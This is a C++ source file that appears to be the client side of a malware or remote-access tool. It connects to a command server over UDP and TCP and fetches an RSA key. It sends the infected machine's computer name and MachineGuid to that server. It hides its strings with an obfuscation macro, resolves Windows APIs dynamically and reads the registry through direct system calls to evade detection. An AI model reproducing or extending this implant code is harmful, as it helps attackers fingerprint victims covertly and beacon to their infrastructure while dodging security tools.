#include "client.h"
#include "External/obfuscate.h"
#include "serialization.h"

#ifdef CLIENT_RELEASE

Client::Client() {
	NetCommon::LoadWSAFunctions();

	// setup udp addr

	hostent* host = GetHostByName(DNS_NAME.c_str());
	if ( host == NULL )
		return;

	sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = HostToNetworkShort(5454);

	// set udp server info
	this->m_UDPServerDetails.addr = addr;
	this->m_UDPServerDetails.domain = AF_INET;
	this->m_UDPServerDetails.port = 5454;
	this->m_UDPServerDetails.type = SOCK_DGRAM;
}

Client::~Client() {
	this->Disconnect(); // disconnect incase the socket is still connected

	CleanWSA();
	Remote.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
}

void Client::SetRemoteComputerName() {
	char  buffer[256];
	DWORD buffSize = sizeof(buffer);

	// get computer name
	BOOL success = Remote.GetNative<_GetComputerNameA>((char*)HIDE("GetComputerNameA")).call(buffer, &buffSize);

	if ( success )
		this->m_ComputerName = buffer;
}

BOOL Client::Connect() {
	// make request to udp server
	this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( this->m_UDPSocket == INVALID_SOCKET )
		return FALSE;

	ClientRequest request(ClientRequest::kConnectClient, 0, this->m_UDPSocket);

	BOOL validServerResponse = SendMessageToServer(this->m_UDPServerDetails, request, this->m_UDPServerDetails.addr);
	if ( !validServerResponse )
		return FALSE;  

	UDPResponse response;
	sockaddr_in serverAddr;
	BOOL received = ReceiveMessageFromServer(this->m_UDPServerDetails, response, serverAddr);
	if ( !received )
		return FALSE;

	this->m_UDPServerDetails.addr = serverAddr;
	this->m_TCPServerDetails = response.TCPServer;

	// connect to tcp server
	this->m_TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
	if ( this->m_TCPSocket == INVALID_SOCKET )
		return FALSE;

	int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
	if ( connect == SOCKET_ERROR )
		return FALSE;

	GetPublicRSAKeyFromServer();
	SendComputerNameToServer();
	SendMachineGUIDToServer();
	return TRUE;
}

void Client::SetRemoteMachineGUID() {
	OBJECT_ATTRIBUTES obj;
	InitializeObjectAttributes(&obj, 0, 0, 0, 0);

	std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
	std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

	UNICODE_STRING reg;
	reg.Buffer = wide.data();
	reg.Length = wide.size() * sizeof(wchar_t);
	reg.MaximumLength = sizeof(reg.Buffer);

	std::string hiddenName = std::string(HIDE("MachineGuid"));
	std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

	UNICODE_STRING valueName;
	valueName.Buffer = name.data();
	valueName.Length = name.size() * sizeof(wchar_t);
	valueName.MaximumLength = sizeof(valueName.Length);

	obj.Length = sizeof(OBJECT_ATTRIBUTES);
	obj.RootDirectory = NULL;
	obj.ObjectName = &reg;
	obj.SecurityDescriptor = NULL;
	obj.SecurityQualityOfService = NULL;
	obj.Attributes = OBJ_CASE_INSENSITIVE;

	HANDLE key;
	SysNtOpenKey(&key, GENERIC_READ, &obj);

	char buffer[512];
	u_long size;
	SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
	PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
	std::wstring data = ( wchar_t* ) pk->Data;
	std::string string = std::string(data.begin(), data.end());
	this->m_MachineGUID = string;
}

BYTESTRING Client::MakeTCPRequest(ClientRequest req, BOOL encrypted) {

	BOOL sent = encrypted ? SendEncryptedMessageToServer(this->m_TCPServerDetails, req) : SendMessageToServer(this->m_TCPServerDetails, req);
	if ( !sent ) return {};

	BYTESTRING serverResponse;
	BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, NetCommon::GetBIOFromString(this->m_Secrets.strPublicKey));
	if ( !received ) return {};

	return serverResponse;
}

BOOL Client::SendComputerNameToServer() {
	SetRemoteComputerName();
	BYTESTRING computerName = Serialization::SerializeString(this->m_ComputerName);

	BIO* key = NetCommon::GetBIOFromString(this->m_Secrets.strPublicKey);
	BOOL success = NetCommon::TransmitData(computerName, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
	BIO_free(key);
	return success;
}

BOOL Client::SendMachineGUIDToServer() {
	SetRemoteMachineGUID();
	BYTESTRING guid = Serialization::SerializeString(this->m_MachineGUID);
	BIO* key = NetCommon::GetBIOFromString(this->m_Secrets.strPublicKey);
	BOOL success = NetCommon::TransmitData(guid, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
	BIO_free(key);
	return success;
}

BOOL Client::GetPublicRSAKeyFromServer() {
	ClientRequest request(ClientRequest::kRequestPublicEncryptionKey, this->m_TCPSocket);

	// receive the rsa public key
	BYTESTRING serialized = MakeTCPRequest(request);
	
	// the base64 encoded ras key
	std::string base64 = Serialization::BytestringToString(serialized);
	std::string bio = "";
	macaron::Base64::Decode(base64, bio);
	
	this->m_Secrets.strPublicKey = bio;
	MessageBoxA(NULL, bio.c_str(), "", MB_OK);

	return !this->m_Secrets.strPublicKey.empty();
}

template <typename _Ty>
BOOL Client::ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr) {
	if ( who.type == SOCK_STREAM )
		return NetCommon::ReceiveData(out, this->m_TCPSocket, TCP);
	else if ( who.type == SOCK_DGRAM )
		return NetCommon::ReceiveData(out, this->m_UDPSocket, UDP, outAddr);
	
	return FALSE;
}

BOOL Client::SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr) {
	if ( dest.type == SOCK_STREAM ) // tcp
		return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
	else if ( dest.type == SOCK_DGRAM ) // udp
		return NetCommon::TransmitData(message, this->m_UDPSocket, UDP, udpAddr);

	return FALSE;
}

BOOL Client::SendEncryptedMessageToServer(Server dest, ClientMessage message) {
	BIO* pk = NetCommon::GetBIOFromString(this->m_Secrets.strPublicKey);
	BOOL success = FALSE;
	if ( dest.type == SOCK_STREAM ) // tcp
		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);
	else if ( dest.type == SOCK_DGRAM ) // udp
		success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);

	return success;
}

BOOL Client::Disconnect() {
	CloseSocket(this->m_UDPSocket);
	int status = CloseSocket(this->m_TCPSocket);
	if ( status == SOCKET_ERROR )
		return FALSE;

	return TRUE;
}

#elif defined(SERVER_RELEASE)

Client::Client(SOCKET tcp, SOCKET udp, sockaddr_in addr)
	: AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp)
{
	std::random_device gen;
	std::mt19937 rng(gen());
	std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
	this->ClientUID = dist(rng);
}

#endif